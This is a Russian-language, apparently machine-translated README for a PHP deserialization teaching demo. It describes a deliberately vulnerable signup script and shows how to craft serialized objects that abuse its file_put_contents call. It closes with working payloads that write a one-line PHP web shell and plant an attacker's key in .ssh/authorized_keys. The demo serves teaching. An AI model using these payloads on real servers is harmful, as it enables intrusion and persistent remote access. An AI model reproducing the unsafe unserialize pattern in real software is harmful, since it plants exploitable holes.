
# Демонстрация десериализации
Я создал эту демонстрацию для нашего сессии [Advanced Web Hacking](https://shefesh.com/assets/wiki/Advanced%20Web%20Hacking%20-%20PDF.pdf).

Это демонстрация очень простой уязвимости десериализации в PHP. Подробнее о десериализации можно увидеть на вышепереопределённых слайдах.

## Код демонстрации
Репозитор доступен по адресу: [https://github.com/Twigonometry/Deserialisation-Demo](https://github.com/Twigonometry/Deserialisation-Demo)

### Уязвимый код
#### unsafe.php

Это простая веб-приложение, которое создаёт объект `SignupForm` и записывает его в файл, когда вызывается метод `__destruct()` [magic method](https://www.php.net/manual/en/language.oop5.magic.php). Оно принимает параметр GET `username`, который используется для записи имени пользователя в список подписанных пользователей. Это делается с помощью функций класса `parse_username()` и `__destruct()`.

#### Уязвимость

Классовые переменные `$outfile` и `$username_string` обычно устанавливаются методом `parse_username()`. Однако атакующий может вручную создать объект `SignupForm` и установить эти переменные по своему усмотрению. Если это передаётся в параметр GET `username`, он десериализуется и автоматически вызывается метод `__destruct()`. Это пропускает метод `parse_username()` и изменяет переменные, так что значения, контролируемые атакующим, используются в вызове `file_put_contents()`.

Уязвимость существует только потому, что небезопасные данные (то есть ввод пользователя) передаются напрямую в функцию `unserialize()`. Удалите эту строку, и уязвимость будет исправлена. На самом деле, это даже не необходимо для работы программы — она существует только для объяснения механизма уязвимости, но могут быть ситуации, когда `unserialize()` имеет реальный применение — например, фреймворки вроде Laravel десериализуют PHP объекты, представляющие пользователей. В этом случае разработчики должны убедиться, что никакие небезопасные данные не участвуют в десериализации, либо напрямую, либо «вверх по потоку» при передаче данных из базы данных или подобного соединённого сервиса.

### Триггер атаки
#### generate-object.php

Это реконструкция класса, используемого в веб-приложении, которую атакующий может создать с «whitebox» видом файла `unsafe.php` веб-приложения.

Он создаёт экземпляр класса с предопределёнными значениями, которые используются при десериализации объекта. Переменная `$username_string` определяет содержимое, которое будет записано в файл, а переменная `$outfile` определяет путь (в директории веб-сервера). Изменяя эти переменные, вы изменяете поведение вашего пулла.

По умолчанию объект выглядит так:

```
O:10:"SignupForm":2:{s:7:"outfile";s:10:"gotcha.txt";s:15:"username_string";s:25:"malicious stuff goes here";}
```

Синтаксис выглядит следующим образом:
- `O` — указывает на тип «объект»
- `10` — указывает на длину символов названия класса `SignupForm`
- `2` — указывает на количество переменных в объекте
- В фигурных скобках `{ }` находятся переменные объекта. Они имеют похожую структуру: каждая имеет тип (`s` означает «строка»), имя переменной и длину (`7:"outfile"`), а также значение (строка (`s`), длиной 10 символов, называемая `"gotcha.txt"`). Имена переменных и их значения, а также каждый парный из них, разделены точкой с запятой `;`.

Это запишет строку "malicious stuff goes here" в файл `gotcha.txt`. Довольно безвредно, но это показывает, как работает атака!

Конечно, вы можете создавать эти переменные вручную — но подсчитывать длину большого количества имен переменных трудно, и легко совершить синтаксическую ошибку!

#### Триггинг атаки
Объект десериализованный должен быть создан (см. `generate-object.php`) и затем передан в параметр GET `username`. Чтобы протестировать это локально, запустите ваш веб-сервер:

```
$ php -S localhost:5000
```

Замените ваш пулл, изменяя переменные `$username_string` и `$outfile` в `generate-object.php`, затем сделайте запрос для получения объекта:

```
$ curl localhost:5000/generate-object.php
```

Затем сделайте запрос на страницу, передавая объект в параметр GET `username`:

```
http://localhost:5000/unsafe.php?username={SERIALISED OBJECT HERE}
```

*Примечание:* Если вы используете curl, bash может вызвать проблемы с фигурными скобками. Вы можете посетить URL в браузере или использовать флаг `--globoff` для [экранирования скобок](https://stackoverflow.com/questions/8333920/passing-a-url-with-brackets-to-curl)

Вот запрос, который мы сделали, используя наш зловредный объект:

```
http://localhost:5000/unsafe.php?username=O:10:"SignupForm":2:{s:7:"outfile";s:10:"gotcha.txt";s:15:"username_string";s:25:"malicious stuff goes here";}
```

Файл `gotcha.txt` должен теперь появиться в директории веб-сервера!

*Ещё один примечание:* Помните, что всё, что вы вставляете в пулл, происходит на вашем компьютере — если кто-то будет следить за директорией вашего установления за ненадобными `.txt` файлами и вы напишете что-то, что не должно быть, не приходите к нам с жалобами.

#### Пуллы атаки
Наш пример атаки записывает довольно безвредное содержимое в `gotcha.txt`, демонстрируя уязвимость. Однако существует множество способов эксплуатировать произвольную запись в файл, даже в рамках текущей директории. Вот несколько примеров:

**Запись Web Shell**
Это не обязательно позволит вам повысить привилегии, но даст возможность выполнять больше действий на устройстве, кроме записи в файлы. У вас будут права пользователя, который запускает веб-сервер (не запускайте веб-сервера как root!).

Вот десериализованный объект для дерзкого однострочного PHP шелла:

```
O:10:"SignupForm":2:{s:7:"outfile";s:7:"cmd.php";s:15:"username_string";s:29:"<?php system($_GET['cmd']);?>";}
```

Если вы редактируете переменную `$username_string` здесь, вам может потребоваться экранировать символ `$` следующим образом: `public $username_string = "<?php system(\$_GET['cmd']);?>";`

**Запись SSH-ключа**
Местоположение файла ограничено префиксом `__DIR__`. Однако, если по какой-то небоже причине этот веб-сервер был размещён в домашней директории пользователя, пулл такой, как выше, может записать SSH-ключ в файл `.ssh/authorized_keys`. Как и выше, это не повышает ваши привилегии, но даёт более интерактивный шелл.

Вот объект:

```
O:10:"SignupForm":2:{s:7:"outfile";s:20:".ssh/authorized_keys";s:15:"username_string";s:20:"YOUR ID_RSA.pub HERE";}
```

Не нужно говорить об этом, но "YOUR ID_RSA.pub HERE" — это не корректный SSH-ключ. Если вы хотите, чтобы это работало, убедитесь, что его заменяете (идеально в файле `generate-object.php`, так как он сам рассчитывает длину).
